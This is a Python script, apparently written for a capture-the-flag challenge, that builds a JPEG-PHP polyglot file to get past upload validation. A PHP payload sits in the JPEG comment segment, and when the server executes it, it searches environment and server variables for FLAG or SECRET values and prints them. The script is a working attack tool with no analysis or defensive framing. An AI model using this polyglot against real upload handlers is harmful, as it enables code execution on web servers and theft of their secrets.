import struct

def create_polyglot_jpeg_php():
    """Create a polyglot JPEG-PHP file that bypasses upload validation"""
    
    # PHP payload to extract environment variables and search for FLAG
    php_payload = b"""<?php
$flag = getenv('FLAG') ?: getenv('SECRET') ?: getenv('CTF_FLAG') ?: getenv('ENV_FLAG');
if (!$flag) {
    $flag = $_ENV['FLAG'] ?: $_ENV['SECRET'] ?: $_SERVER['FLAG'] ?: $_SERVER['SECRET'];
}
if (!$flag) {
    $env = array_merge($_ENV, $_SERVER);
    foreach($env as $k => $v) {
        if (strpos($v, 'FLAG{') !== false) { echo "Found: $k=$v"; exit; }
    }
}
echo $flag;
?>"""
    
    # JPEG file structure
    # SOI (Start of Image) marker
    jpeg_data = b"\xFF\xD8"
    
    # COM (Comment) segment - this is where we embed PHP code
    # Format: FF FE [2-byte length] [comment data]
    com_length = len(php_payload) + 2  # +2 for length field itself
    jpeg_data += b"\xFF\xFE"
    jpeg_data += struct.pack(">H", com_length)  # Big endian length
    jpeg_data += php_payload
    
    # APP1 (EXIF) segment with minimal EXIF data
    # This helps pass more strict JPEG validation
    exif_data = b"Exif\x00\x00MM\x00*\x00\x00\x00\x08\x00\x00\x00"
    app1_length = len(exif_data) + 2
    jpeg_data += b"\xFF\xE1"
    jpeg_data += struct.pack(">H", app1_length)
    jpeg_data += exif_data
    
    # DQT (Define Quantization Table) - required for valid JPEG
    dqt_data = b"\x00" + b"\x08" * 63  # 64-byte quantization table
    dqt_length = len(dqt_data) + 2
    jpeg_data += b"\xFF\xDB"
    jpeg_data += struct.pack(">H", dqt_length)
    jpeg_data += dqt_data
    
    # SOF0 (Start of Frame) - baseline DCT
    sof0_data = b"\x08\x00\x01\x00\x01\x00\x00"  # 8-bit, 1 component, 1x1 image
    sof0_length = len(sof0_data) + 2
    jpeg_data += b"\xFF\xC0"
    jpeg_data += struct.pack(">H", sof0_length)
    jpeg_data += sof0_data
    
    # DHT (Define Huffman Table) - required for valid JPEG
    dht_data = b"\x00\x00\x01\x00\x00"  # Minimal Huffman table
    dht_length = len(dht_data) + 2
    jpeg_data += b"\xFF\xC4"
    jpeg_data += struct.pack(">H", dht_length)
    jpeg_data += dht_data
    
    # SOS (Start of Scan) - 1 component
    sos_data = b"\x01\x00\x00"
    sos_length = len(sos_data) + 2
    jpeg_data += b"\xFF\xDA"
    jpeg_data += struct.pack(">H", sos_length)
    jpeg_data += sos_data
    
    # Minimal compressed image data (1x1 pixel)
    # This is a valid 1x1 JPEG scan data
    jpeg_data += b"\x00"
    
    # EOI (End of Image) marker
    jpeg_data += b"\xFF\xD9"
    
    # Save the polyglot file
    filename = "polyglot_flag.jpeg"
    with open(filename, "wb") as f:
        f.write(jpeg_data)
    
    print(f"[+] Successfully created polyglot JPEG-PHP file: {filename}")
    print(f"[+] File size: {len(jpeg_data)} bytes")
    print(f"[+] PHP payload size: {len(php_payload)} bytes")
    print(f"[+] File structure:")
    print(f"  - SOI marker: FF D8")
    print(f"  - COM segment with PHP payload: FF FE")
    print(f"  - APP1 segment: FF E1")
    print(f"  - DQT segment: FF DB")
    print(f"  - SOF0 segment: FF C0")
    print(f"  - DHT segment: FF C4")
    print(f"  - SOS segment: FF DA")
    print(f"  - EOI marker: FF D9")
    print(f"\n[+] PHP payload embedded:")
    print(php_payload.decode())
    
    return filename

if __name__ == "__main__":
    create_polyglot_jpeg_php()
